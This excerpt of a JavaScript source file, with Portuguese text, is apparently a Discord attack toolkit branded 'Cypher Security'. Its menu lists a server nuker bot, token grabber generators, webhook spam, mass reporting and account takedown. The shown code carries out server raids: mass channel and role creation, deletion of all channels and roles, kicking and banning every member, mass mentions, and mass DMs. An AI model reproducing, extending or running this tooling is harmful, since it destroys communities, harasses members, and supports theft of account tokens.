...
var Q6 = "[06] Nuker [Bot]"
var Q7 = "[07] Token Checker [System]"
var Q0 = "[0] Sair [Exit]"

var Q8 = "[08] Webhook spawn (PY)"
var Q9 = "[09] Webhook delete (PY)"
var Q10 = "[10] Criar um Token Grabber (PY) "
var Q11 = "[11] Denúncias em massa (PY)"
var Q12 = "[12] Derrubar uma conta (PY)"
var Q13 = "[13] Consulta CPF [OFF]"
var Q14 = "[14] Consulta CPNJ [OFF]"
var Q15 = "[15] Criar um Token Grabber (JS)"
...
`.red
    ...
    `.magenta
                    ...
                    **${emoji_menu} Limpa uma conta:** \`${prefix}tk_clean\`
                    `
                            ...
                            if (message.content.startsWith(prefix +
                                ...
                                if (message.author.id != myID) {
                                    console.log(
                                        `     [Cypher Security] Um idiota tentou utilizando um comando`
                                        .white
                                    );
                                    return message.reply(
                                        "Você não pode utilizar este comando!"
                                ...
                                console.log(
                                    "     [Cypher Security] Mudando icone & nome do servidor"
                                    .green
                                );
                            ...
                            if (message.content.startsWith(prefix +
                                ...
                                if (!message.guild.me.permissions.has(
                                    ...
                                    message.delete();
                                    console.log(yellow(
                                        "    [Cypher Security] Criando Canais"
                                        ));
                                    for (var i = 0; i <
                                        criar_canais; i++) {
                            ...
                            if (message.content.startsWith(prefix +
                                ...
                                if (!message.guild.me.hasPermission(
                                    ...
                                    return console.log(
                                        red(
                                            "     [Cypher Security] O bot esta sem permição")
                                    );
                                } else {
                                    if (message.author.id != myID) {
                                        console.log(
                                        ...
                                        if (!argresult) {
                                            console.log(
                                                blueBright(
                                                    `     [Cypher Security] Marcando e postando umas coisas`
                                                )
                                            );
                                            for (var i = 0; i <
                                                marcação; i++) {
                                        ...
                                        console.log(
                                            "     [Cypher Security] Marcando e criado canais"
                                            .red);
                                        for (var i = 0; i <
                                            marcação; i++) {
                            ...
                            if (message.content.startsWith(prefix +
                                ...
                                if (!message.guild.me.permissions.has(
                                    ...
                                    message.delete();
                                    console.log(
                                        "     [Cypher Security] Criando cargos"
                                        .green);
                                    for (var i = 0; i <
                                        criar_cargos; i++) {
                                        message.guild.roles
                                            ...
                                            .catch(e =>
                                                console.error(red(
                                                    "     [Cypher Security] Erro ao criar cargos"
                                                    ))
                                            );
                                    }
                                }
                            ...
                            if (message.content.startsWith(prefix +
                                ...
                                console.log(
                                    "     [Cypher Security] Deletando todos os canais"
                                    .yellow);
                            ...
                            if (message.content.startsWith(prefix +
                                    "chute")) {
                                console.log(
                                    "     [Cypher Security] Expulsando todos os membros"
                                    );
                                if (!message.guild.me.permissions.has(
                                        "KICK_MEMBERS")) {
                                    return message.reply(
                                        ...
                                        member => {
                                            member
                                                ...
                                                .then(
                                                    console.log(
                                                        green(
                                                            `     [Cypher Security] ${member.user.tag} foi expulso`
                                                            )
                                                    )
                                                )
                                                .catch(e =>
                                                    console.error(
                                                        red(
                                                            `     [Cypher Security] Incapaz de expulsar ${member.user.tag}`
                                                        )
                                                    )
                                                );
                                        });
                            ...
                            if (message.content.startsWith(prefix +
                                ...
                                console.log("     [Cypher Security] Deletando cargos"
                                    .green);
                                ...
                                roles => {
                                    roles
                                        ...
                                        .catch(e =>
                                            console.error(
                                                red(
                                                    `     [Cypher Security] Erro ao deletar um cargo`)
                                            )
                                        );
                                });
                            }
                            ...
                            if (message.content.startsWith(prefix +
                                ...
                                console.log(
                                    "     [Cypher Security] Banindo todos os membros"
                                    .blue);
                                if (!message.guild.me.permissions.has(
                                        "BAN_MEMBERS")) {} else {
                                    message.guild.members.cache.forEach(
                                        member => {
                                            member
                                                ...
                                                .then(
                                                    console.log(
                                                        green(
                                                            `     [Cypher Security] ${member.user.tag} foi banido`
                                                            )
                                                    )
                                                )
                                                .catch(e =>
                                                    console.error(
                                                        red(
                                                            `     [Cypher Security] Incapaz de banir ${member.user.tag}`
                                                        )
                                                    )
                                                );
                                        });
                            ...
                            if (message.content.startsWith(prefix +
                                ...
                                console.log(
                                    "     [Cypher Security] Enviando mensagem no privado de todos"
                                    .blue
                                );
                                if (message.author.id !== myID) return;
                                const msg = args[0];
                                    ...
                                    member => {
                                        member
                                            ...
                                            .then(
                                                console.log(
                                                    green(
                                                        `     [Cypher Security] Mensagem enviada para ${member.user.tag}`
                                                    )
                                                )
                                            )
                                            .catch(e =>
                                                console.error(
                                                    red(
                                                        `     [Cypher Security] Erro ao enviar para ${member.user.tag}`
                                                    )
                                                )
                                            );
                                    });
        ...
        default:
            console.log(colors.red("         [?] Erro de opção: opção incorreta usada."));
        }
    });
}
